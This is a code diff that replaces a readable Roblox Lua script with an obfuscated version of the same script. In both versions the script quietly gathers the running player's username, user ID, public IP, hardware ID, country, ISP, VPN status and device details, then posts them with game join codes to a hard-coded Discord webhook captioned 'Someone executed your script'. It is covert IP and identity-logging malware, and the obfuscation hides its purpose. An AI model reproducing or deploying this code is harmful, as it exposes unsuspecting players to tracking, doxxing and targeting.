@@ -1,118 +1,12 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local UserInputService = game:GetService("UserInputService")
-local GuiService = game:GetService("GuiService")
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 
 
--- Player Info
-local LocalPlayer = Players.LocalPlayer
-local Userid = LocalPlayer.UserId
-local DName = LocalPlayer.DisplayName
-local Name = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = game.LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
-local LuaJoinCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", game.PlaceId, game.JobId)
+]]--
 
--- Game Info
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
-
--- Detecting Device Type and Details
-local function getDeviceInfo()
-    local deviceType = "Unknown"
-    local details = {}
-
-    if GuiService:IsTenFootInterface() then
-        deviceType = "Console"
-    elseif UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
-        deviceType = "Mobile"
-        local viewportSize = workspace.CurrentCamera.ViewportSize
-        details.screenResolution = string.format("%dx%d", viewportSize.X, viewportSize.Y)
-        details.deviceOrientation = (viewportSize.X > viewportSize.Y) and "Landscape" or "Portrait"
-        details.isTablet = (viewportSize.Y > 600) and "Tablet" or "Phone"
-    else
-        deviceType = "Desktop"
-        details.hasKeyboard = UserInputService.KeyboardEnabled
-        details.hasMouse = UserInputService.MouseEnabled
-        details.hasTouch = UserInputService.TouchEnabled
-        details.hasGamepad = UserInputService.GamepadEnabled
-    end
-
-    details.graphicsQuality = UserSettings().GameSettings.SavedQualityLevel
-    details.viewportSize = tostring(workspace.CurrentCamera.ViewportSize)
-
-    return deviceType, details
-end
-
--- VPN and ISP Detection
-local function getVpnAndIspInfo()
-    local ipData = HttpService:JSONDecode(GetData)
-    local isVpn = ipData.proxy == true and "Y" or "N"
-    local isp = ipData.isp or "Unknown"
-    return isVpn, isp
-end
-
--- Creating Webhook Data
-local function createWebhookData()
-    local deviceType, deviceDetails = getDeviceInfo()
-    local isVpn, isp = getVpnAndIspInfo()
-    
-    local data = {
-        ["avatar_url"] = "https://github.com/tomoneko2222/tomonekonet.tool/blob/main/logo.png?raw=true",
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["author"] = {
-                    ["name"] = "Someone executed your script",
-                    ["url"] = "https://roblox.com",
-                },
-                ["description"] = string.format(
-                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
-                    "\n**Device Type:** %s" ..
-                    "\n**Device Details:** %s" ..
-                    "\n**VPN:** %s" ..
-                    "\n**Provider:** %s" ..
-                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                    "\n**Game:** %s \n**Game Id**: %d" ..
-                    "\n\n**Data:**```%s```\n\n**Console JobId:**```%s```\n\n**Lua Join Code:**```lua\n%s```",
-                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
-                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    deviceType, HttpService:JSONEncode(deviceDetails),
-                    isVpn, isp,
-                    game.PlaceId, GAMENAME, game.PlaceId,
-                    GetData, ConsoleJobId, LuaJoinCode
-                ),
-                ["type"] = "rich",
-                ["color"] = tonumber("0xFFD700"),
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
-                },
-            }
-        }
-    }
-    return HttpService:JSONEncode(data)
-end
-
--- Sending Webhook
-local function sendWebhook(webhookUrl, data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(abcdef)
-end
-
--- Replace the webhook URL with your own URL
-local webhookUrl = "https://discord.com/api/webhooks/1289573346127773736/4DBaHOUuyz2Dkadmm3mx-yg5rWrwxLLwLFOaeFHQjEVjL--uYw16VCXja5-YLw0_GQSP"
-local webhookData = createWebhookData()
-
--- Sending the webhook
-sendWebhook(webhookUrl, webhookData)
+local v0=game:GetService("HttpService");local v1=game:GetService("Players");local v2=game:GetService("MarketplaceService");local v3=game:GetService("UserInputService");local v4=game:GetService("GuiService");local v5=v1.LocalPlayer;local v6=v5.UserId;local v7=v5.DisplayName;local v8=v5.Name;local v9=tostring(v5.MembershipType):sub(21);local v10=v5.AccountAge;local v11=game.LocalizationService.RobloxLocaleId;local v12=game:HttpGet("https://v4.ident.me/");local v13=game:HttpGet("http://ip-api.com/json");local v14=game:GetService("RbxAnalyticsService"):GetClientId();local v15="Roblox.GameLauncher.joinGameInstance("   .. game.PlaceId   .. ', "'   .. game.JobId   .. '")' ;local v16=string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')",game.PlaceId,game.JobId);local v17=v2:GetProductInfo(game.PlaceId).Name;local function v18() local v24=890 -(668 + 222) ;local v25;local v26;while true do if (v24==0) then v25="Unknown";v26={};v24=1;end if (v24==(1 + 0)) then if v4:IsTenFootInterface() then v25="Console";elseif (v3.TouchEnabled and  not v3.MouseEnabled) then v25="Mobile";local v44=workspace.CurrentCamera.ViewportSize;v26.screenResolution=string.format("%dx%d",v44.X,v44.Y);v26.deviceOrientation=((v44.X>v44.Y) and "Landscape") or "Portrait" ;v26.isTablet=((v44.Y>(1477 -(282 + 595))) and "Tablet") or "Phone" ;else local v48=1637 -(1523 + 114) ;while true do if (v48==2) then v26.hasGamepad=v3.GamepadEnabled;break;end if (v48==(1 + 0)) then v26.hasMouse=v3.MouseEnabled;v26.hasTouch=v3.TouchEnabled;v48=2;end if (v48==(0 -0)) then v25="Desktop";v26.hasKeyboard=v3.KeyboardEnabled;v48=1066 -(68 + 997) ;end end end v26.graphicsQuality=UserSettings().GameSettings.SavedQualityLevel;v24=1272 -(226 + 1044) ;end if (v24==(8 -6)) then v26.viewportSize=tostring(workspace.CurrentCamera.ViewportSize);return v25,v26;end end end local function v19() local v27=v0:JSONDecode(v13);local v28=((v27.proxy==true) and "Y") or "N" ;local v29=v27.isp or "Unknown" ;return v28,v29;end local function v20() local v30,v31=v18();local v32,v33=v19();local v34={avatar_url="https://github.com/tomoneko2222/tomonekonet.tool/blob/main/logo.png?raw=true",content="",embeds={{author={name="Someone executed your script",url="https://roblox.com"},description=string.format("__[Player Info](https://www.roblox.com/users/%d)__"   .. " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s"   .. "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s"   .. "\n**Device Type:** %s"   .. "\n**Device Details:** %s"   .. "\n**VPN:** %s"   .. "\n**Provider:** %s"   .. "\n\n__[Game Info](https://www.roblox.com/games/%d)__"   .. "\n**Game:** %s \n**Game Id**: %d"   .. "\n\n**Data:**```%s```\n\n**Console JobId:**```%s```\n\n**Lua Join Code:**```lua\n%s```" ,v6,v7,v8,v6,v9,v10,v11,v12,v14,tostring(os.date("%m/%d/%Y")),tostring(os.date("%X")),v30,v0:JSONEncode(v31),v32,v33,game.PlaceId,v17,game.PlaceId,v13,v15,v16),type="rich",color=tonumber("0xFFD700"),thumbnail={url="https://www.roblox.com/headshot-thumbnail/image?userId="   .. v6   .. "&width=150&height=150&format=png" }}}};return v0:JSONEncode(v34);end local function v21(v35,v36) local v37=0 + 0 ;local v38;local v39;local v40;while true do if (v37==(1 + 0)) then v40={Url=v35,Body=v36,Method="POST",Headers=v38};v39(v40);break;end if (v37==0) then v38={["content-type"]="application/json"};v39=http_request or v39 or HttpPost or syn.request ;v37=958 -(892 + 65) ;end end end local v22="https://discord.com/api/webhooks/1289573346127773736/4DBaHOUuyz2Dkadmm3mx-yg5rWrwxLLwLFOaeFHQjEVjL--uYw16VCXja5-YLw0_GQSP";local v23=v20();v21(v22,v23);
